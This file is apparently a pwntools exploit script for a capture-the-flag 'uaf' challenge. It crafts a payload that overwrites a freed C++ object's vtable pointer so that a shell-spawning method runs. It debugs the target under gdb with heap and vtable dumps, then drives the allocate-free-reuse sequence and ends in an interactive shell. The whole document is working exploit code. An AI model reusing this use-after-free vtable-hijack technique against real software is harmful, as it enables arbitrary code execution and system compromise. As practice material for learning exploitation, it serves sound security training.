#!/usr/bin/env python2

from pwn import *
import os


SCRIPT_PATH = os.path.dirname(__file__)


def main():
    payload = "a" * 0x18
    payload = p64(0x0000000000401550 - 0x8) + "a" * 0x10
    payload = p64(0x0000000000401588) + "a" * 0x10   # obj.vtableforHuman + 0x8 to align for Human::get_shel()

    payload_len = len(payload)
    payload_path = os.path.join(SCRIPT_PATH, "payload.txt")
    open(payload_path, "w").write(payload)

    gdb_break_script = "\n".join([
        "commands",
            "echo \\n\\n\\n",

            "set $jill = *(unsigned long *)($rbp-0x30)",
            "set $jack = *(unsigned long *)($rbp-0x38)",

            "heap chunks",
            "echo \\n\\n\\n",

            "echo Jack object: ",
            "x/xw ($rbp-0x38)",    # Jack
            "dereference $jack l4",

            "echo \\n",

            "echo Jill object: ",
            "x/xw ($rbp-0x30)",    # Jill
            "dereference $jill l4",

            "echo \\n\\n\\n",
        "end",
    ])

    gdb_script = "\n".join([
        # "break main",
        "gef config context.enable False",

        "echo \\n\\n\\n",
        "echo Vtable:Human:\\n",
        "dereference 0x401580 l4",

        "echo \\n\\n\\n",
        "echo Vtable:Woman:\\n",
        "dereference 0x401540 l4",


        "echo \\n\\n\\n",
        "echo Vtable:Man:\\n",
        "dereference 0x401560 l4",

        "echo \\n\\n\\n",

        # "break *(main+0x3c)",   # create Jack
        # "break *(main+0x9a)",

        "break *(main+0x10d)",  # PIE handling
        gdb_break_script,

        # "break *(main+0x1b2)",  # Destroy objects
        # gdb_break_script,


        "continue",
    ])

    s = gdb.debug(["./uaf", "%i" % payload_len, payload_path], gdbscript=gdb_script)

    # User interaction
    s.sendline("1")  # Use
    s.sendline("3")  # Free objects
    s.sendline("2")  # Make chunk from file
    s.sendline("2")  # Make another chunnk to occupy the second object
    s.sendline("1")  # Use after free

    s.interactive()


if __name__ == '__main__':
    main()
